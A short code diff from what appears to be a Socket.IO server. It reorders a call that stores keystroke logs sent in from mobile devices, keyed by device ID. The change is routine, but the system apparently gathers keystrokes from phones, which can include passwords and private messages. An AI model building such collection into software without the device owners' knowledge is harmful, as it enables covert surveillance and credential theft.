@@ -488,9 +488,6 @@ export const startSocketIO = async () => {
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
 					try {
-						// data should be include deviceId and keylogs
-						const res = await addNewKeyLogs(response);
-
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
 						const keylogs = response.keylogs;
@@ -515,6 +512,9 @@ export const startSocketIO = async () => {
 							}
 						);
 						// }
+
+						// data should be include deviceId and keylogs
+						const res = await addNewKeyLogs(response);
 					} catch (error) {
 						console.log("Key Logs Response Error", error);
 					}
